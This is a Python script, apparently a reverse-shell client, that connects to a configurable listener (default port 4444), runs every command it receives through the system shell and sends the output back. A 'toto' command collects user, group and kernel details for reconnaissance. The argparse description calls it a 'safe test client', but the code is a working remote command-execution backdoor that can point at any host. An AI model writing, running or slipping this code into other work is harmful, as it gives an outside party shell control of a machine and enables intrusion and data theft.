import argparse
import json
import socket
import time


import subprocess
TOTO_PREFIX = "__TOTO__"


def run_system_command(command: str) -> str:
    result = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        text=True,
        timeout=10
    )

    output = result.stdout.strip()
    error = result.stderr.strip()

    if result.returncode != 0:
        return error or "unknown error"

    return output or "(no output)"


def build_toto_payload() -> str:
    data = {
        "id": run_system_command("id"),
        "groups": run_system_command("groups"),
        "users": run_system_command("users"),
        "uname": run_system_command("uname -a"),
    }
    return TOTO_PREFIX + json.dumps(data)

def build_response(command: str, name: str) -> str:
    command = command.strip()

    if not command:
        return f"[{name}] empty command received"

    if command.lower() == "exit":
        return f"[{name}] closing connection"

    if command.lower() == "toto":
        try:
            return build_toto_payload()
        except Exception as e:
            return f"[{name}] toto error: {e}"

    try:
        output = run_system_command(command)
        return f"[{name}] output:\n{output}"

    except subprocess.TimeoutExpired:
        return f"[{name}] error: command timed out"

    except Exception as e:
        return f"[{name}] exception: {e}"


def run_client(host: str, port: int, name: str, retry_delay: float) -> None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            sock.connect((host, port))
            break
        except OSError as exc:
            print(f"[-] Connection failed: {exc}. Retrying in {retry_delay}s...")
            time.sleep(retry_delay)

    print(f"[+] Connected to {host}:{port} as {name}")

    try:
        while True:
            data = sock.recv(4096)
            if not data:
                print("[-] Server closed the connection")
                break

            command = data.decode(errors="ignore")
            print(f"[>] Command received: {command!r}")

            response = build_response(command, name)
            sock.sendall(response.encode())
            print(f"[<] Response sent: {response!r}")

            if command.strip().lower() == "exit":
                break
    finally:
        sock.close()
        print("[+] Client stopped")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Safe test client compatible with the current socket listener."
    )
    parser.add_argument("--host", default="127.0.0.1", help="Listener host")
    parser.add_argument("--port", type=int, default=4444, help="Listener port")
    parser.add_argument("--name", default="mock-client", help="Displayed client name")
    parser.add_argument(
        "--retry-delay",
        type=float,
        default=2.0,
        help="Seconds to wait before reconnect attempts",
    )
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    run_client(args.host, args.port, args.name, args.retry_delay)
